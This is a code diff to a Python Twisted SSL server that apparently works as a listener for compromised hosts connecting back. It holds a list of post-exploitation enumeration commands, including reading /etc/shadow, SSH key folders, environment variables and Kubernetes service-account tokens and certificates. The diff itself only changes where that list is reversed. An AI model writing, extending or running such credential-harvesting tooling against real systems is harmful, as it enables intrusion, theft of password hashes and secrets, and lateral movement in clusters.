@@ -2,6 +2,7 @@ from twisted.internet import ssl, reactor
 from twisted.internet.protocol import Protocol, Factory
 
 enum_commands = ['whoami','id','hostname','cat /etc/passwd', 'cat /etc/shadow', 'cat /etc/group','ls -l ~/.ssh/','sudo -l','ps aux','uname -a','env','cat /run/secrets/kubernetes.io/serviceaccount/token','cat /var/run/secrets/kubernetes.io/serviceaccount/token','cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt','strace ls']
+enum_commands.reverse()
 
 
 # Create a protocol to handle incoming connections
@@ -31,7 +32,6 @@ class SSLProtocol(Protocol):
 
     def __init__(self):
         self.enum_commands = enum_commands.copy()
-        self.enum_commands.reverse()
 
     def connectionMade(self):
         print('Connection made')
